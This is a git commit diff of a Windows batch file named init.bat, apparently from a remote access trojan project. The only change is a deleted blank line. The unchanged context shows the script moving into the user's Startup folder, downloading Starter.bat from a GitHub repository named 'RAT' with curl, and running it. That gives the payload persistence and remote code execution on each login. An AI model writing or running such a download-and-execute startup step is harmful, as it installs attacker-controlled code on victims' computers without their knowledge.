161a445d15f347459962347782667c06ed1780f7
saif <saif.aboueldahab@gmail.com>
2023-06-11 23:16:01 +0300

    exe

--- init.bat
+++ init.bat
@@ -3,7 +3,6 @@ set "currentd=%cd%"
 @rem set "username=saifa"
 set "targetd=C:/Users/%username%/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup"
 cd %targetd%
-
 powershell powershell.exe "curl https://raw.githubusercontent.com/saifnasef/RAT/main/Starter.bat -o Starter.bat"
 powershell ./Starter.bat
 cd %currentd%
